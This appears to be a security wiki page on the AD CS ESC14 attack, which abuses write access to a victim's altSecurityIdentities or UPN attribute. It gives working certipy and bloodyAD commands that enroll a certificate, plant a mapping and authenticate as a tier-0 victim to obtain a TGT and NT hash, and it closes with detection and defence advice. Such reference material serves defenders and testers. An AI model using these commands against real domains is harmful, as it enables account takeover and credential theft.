---
title: AD CS ESC14 — altSecurityIdentities abuse
slug: adcs-esc14-altsecidentities
---

> **TL;DR:** Write access to a victim's `altSecurityIdentities` attribute lets you forge or enroll a certificate that maps to the victim under strong cert-binding enforcement.

## What it is
After KB5014754 forced "strong" certificate mapping (May 2022 → full enforcement Feb 2025), the KDC maps a certificate to an account using one of: SID extension (1.3.6.1.4.1.311.25.2) embedded in the cert, an X509-style entry in the target's `altSecurityIdentities` LDAP attribute, or the implicit `userPrincipalName`. ESC14 abuses write rights on `altSecurityIdentities` (or `userPrincipalName`) of a tier-0 target: the attacker plants an explicit mapping that points the KDC at a cert they control, then authenticates as the victim via PKINIT.

## Preconditions / where it applies
- Write right on the target's `altSecurityIdentities` (or `userPrincipalName`) — directly or via [[acl-abuse]] chain.
- AD CS issuing CA that lets the attacker enroll any client-auth cert (even a self-signed one if the CA chain is reachable for X509IssuerSubject mappings).
- KDC running with StrongCertificateBindingEnforcement >= 1 (Compatibility) or 2 (Full).
- Modern DC patched past KB5014754 — strict mapping is what makes this primitive necessary.

## Technique
Five strong mapping formats exist in `altSecurityIdentities`. The two easiest to weaponise are `X509IssuerSerialNumber` (issuer DN + cert serial) and `X509SKI` (Subject Key Identifier). Steps:

1. Enroll any client-auth cert under your own user. Note its Issuer DN and serial number (or SKI).

```bash
certipy req -u me@corp -p 'pw' -ca corp-CA -template User
openssl x509 -in me.pem -noout -issuer -serial
```

2. Plant the mapping on the victim. The PKINIT lookup is case-sensitive; the issuer DN must be reversed and comma-separated as Windows expects.

```bash
bloodyAD -d corp -u me -p 'pw' --host dc set object victim \
  altSecurityIdentities "X509:<I>CN=corp-CA,DC=corp,DC=lab<SR>1A00000000B6..."
```

3. Authenticate as the victim with the cert via PKINIT. Certipy's `auth` does the asn1 dance and returns the victim's TGT (and NT hash for offline use).

```bash
certipy auth -pfx me.pfx -username victim -domain corp -dc-ip 10.0.0.1
```

If the victim already has a UPN you can write, simpler variant: set victim's UPN to an attacker-controlled value, enroll a cert as that UPN, log in.

Result: tier-0 ticket without ever knowing the victim's password and surviving a password reset.

## Detection and defence
- Audit 4662 on `altSecurityIdentities` and `userPrincipalName` writes — there should be near-zero legitimate writers.
- Use the new event 39 / 41 on the KDC: certificate-mapping diagnostics log the issuer + serial used and the mapped account.
- Restrict who can enroll on client-auth templates; force `msPKI-Certificate-Application-Policy` to non-PKINIT EKUs where possible.
- Treat write access to `altSecurityIdentities` as tier-0 — bundle protection with AdminSDHolder.
- See [[adcs-esc16-securityext-disabled]] for the inverse case where SID extension is missing.

## References
- [Hacking Articles — ESC14 walkthrough](https://www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/) — full lab repro
- [Microsoft KB5014754](https://support.microsoft.com/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16) — strong mapping background
- [SpecterOps — ADCS attack research](https://posts.specterops.io/certified-pre-owned-d95910965cd2) — foundational AD CS paper
- [Certipy README — ESC14](https://github.com/ly4k/Certipy) — automation
